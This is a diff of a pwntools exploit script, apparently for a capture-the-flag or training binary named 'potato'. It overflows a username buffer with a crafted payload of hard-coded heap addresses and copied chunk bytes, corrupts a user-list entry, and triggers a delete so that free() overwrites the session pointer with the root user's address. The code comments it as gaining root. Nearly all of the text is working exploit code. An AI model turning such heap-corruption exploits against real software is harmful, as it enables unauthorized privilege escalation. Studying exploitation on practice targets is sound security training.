@@ -8,7 +8,7 @@ elf = ELF("./potato")
 
 p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
 gdb.attach(p, '''
-break login2.c:32
+break userlist.c:84
 continue
 ''')
 
@@ -37,21 +37,16 @@ p.sendline(b"changename")
 payload=b"peter" + b"\x0a"
 p.sendline(payload)
 
-# # register first user, we will overflow this chunk
-# p.sendline(b"register")
-# p.sendline(b"user_0")
-# p.sendline(b"p@ssw0rd")
+# ptr to leaked memory we got when logging in peter
+delete_mem_chunk = 0x8123490
+# ptr to root user: the value which will be written
+root_user_addr = 0x8124090
+# addresss of the session global var
+session_addr = 0x811df58
 
-# # register second user, we manipulate its meta data via
-# # the first users chunk
-# p.sendline(b"register")
-# p.sendline(b"user_1")
-# p.sendline(b"p@ssw0rd")
-
-
-payload1 = (
-"\x90\x40\x12\x08\x90\x34\x12\x08"
-#"\x90\x40\x12\x08\x72\xAA\x41\x41"
+# this chunk is a copy of the peter chunk (starting at byte 8) 
+# and a few following bytes, where all 0x00 bytes were replaced by 0xAA
+some_chunk = (
 "\x41\x41\x03\xAA\xAA\xAA\xb8\xcc"
 "\xff\xff\x18\xAA\xAA\xAA\x01\xAA"
 "\xAA\xAA\x6e\xAA\xAA\xAA\xf4\xcf"
@@ -73,33 +68,21 @@ payload1 = (
 "\xAA\xAA\xc4\xbe\x57\xba\x59\x85"
 "\x06\x08\xc0\x2e\x12\x08\xAA\xAA"
 "\xAA\xAA\x1d\xa6\x06\x08\x30\x40"
-#"\x07\x08\xc0\x2e\x12\x08\xf4\xcf"
-# first four bytes: next pointer
-# second four bytes: user pointer
-
-# address of head entry in user list: 0x8124140
-# user of head entry (root): 0x8124090 (see first four bytes of payload!)
-# leaked memory, digest of peters password: 0x8123490. Can be used to divert the free() in delete()
-# memory chunk to delete: 0x8123490
-# address of currently logged in user: 0x811df58
-
-#"\x58\xdf\x11\x08\x50\x41\x12\x08"
-"\x58\xdf\x11\x08"
 )
 
-gdb.attach(p, '''
-break main
-#break func.c:56           
-#break func.c:185
-#break func.c:191
-break userlist.c:75
-#break userlist.c:38
-continue
-''')
+payload = p32(root_user_addr) + p32(delete_mem_chunk) + bytes(some_chunk, "latin1") + p32(session_addr)
 
-# fill username buffer with As
+# overwrite Peters user buffer and its user_entry_t
 p.sendline(b"changename")
-#payload = b"\x41"*50
-p.sendline(payload1)
+p.sendline(payload)
 
+#
+# delete user 4
+#
+p.sendline(b"delete")
+p.sendline(b"4")
+
+#
+# We should be "root" now
+#
 p.interactive()
